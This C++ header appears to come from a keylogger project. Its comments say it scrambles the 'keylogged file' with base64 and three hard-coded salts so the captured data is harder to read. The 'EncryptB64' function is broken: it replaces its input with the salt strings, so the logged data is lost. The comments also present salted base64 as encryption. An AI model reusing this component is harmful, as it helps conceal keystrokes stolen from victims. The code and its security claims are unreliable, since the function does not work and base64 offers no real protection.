#ifndef BASE64_H_INCLUDED
#define BASE64_H_INCLUDED

#include <vector>
#include <string>

//Base64.h - Our Encryption Functions. While Base64 can be easily decrypted, we are
//making modifications to it so it can't be decrypted as easily

/*
base64 encoding is used to convert binary data into a text-like format
1st step is to take the 3 bytes (24 bits) of binary data and split into
four parts of 6 bits.  That's why its called Base64 (2^6=64): because
it's only printing the first 64 characters from the ASCII table
this prevents from any special characters being printed.
2nd: now we have these 4 sections of 6 bits, which we can convert to decimal values
3rd: lastly we then convert these 4 decimal values to ascii values
note: if the data is not a multiple of 3, the data gets padded with "="

*/

namespace Base64
{
    std::string base64_encode(const std::string &);

    //these will be used to encrypt base64 further, since the basic base64 can be cracked easily
    //so we're gonna triple encode it with some modifications between encodings
    const std::string &SALT1 = "LM::TB::BB";
    const std::string &SALT2 = "_:/_77";
    const std::string &SALT3 = "line=wowC++";

    std::string EncryptB64(std::string s)
    {
        //scrambling the string s, which is our keylogged file, with the SALTS
        //keep in mind we don't have to do this in this order
        //you can have more salts in different orders to scramble the encoding further
        s = SALT1 + SALT2 + SALT3;
        s = base64_encode(s);
        //same here: this is just random
        s.insert(7, SALT3);
        s+= SALT1;
        s = base64_encode(s);
        s=SALT2 + SALT3 + SALT1;
        s = base64_encode(s);
        s.insert(1, "L");
        s.insert(7, "M");
        return s;
    }

    const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string base64_encode(const std::string &s)
    {
        std::string ret;
        int val = 0;
        int bits = -6;
        const unsigned int b63 = 0x3F; //value is 63

        for(const auto &c : s)
        {
            //val will be shifted left by 8 spaces
            val = (val << 8) + c;
            bits += 8;

            while(bits >= 0)
            {
                ret.push_back(BASE64_CODES[ ( val >> bits) & b63 ] );
                bits -=6;
            }
        }

        if(bits > -6)
        {
            ret.push_back(BASE64_CODES[ ( (val << 8) >> (bits + 8) ) &b63]);
        }

        while(ret.size() % 4)
        {
            ret.push_back('=');
        }

        return ret;
    }

}
#endif // BASE64_H_INCLUDED
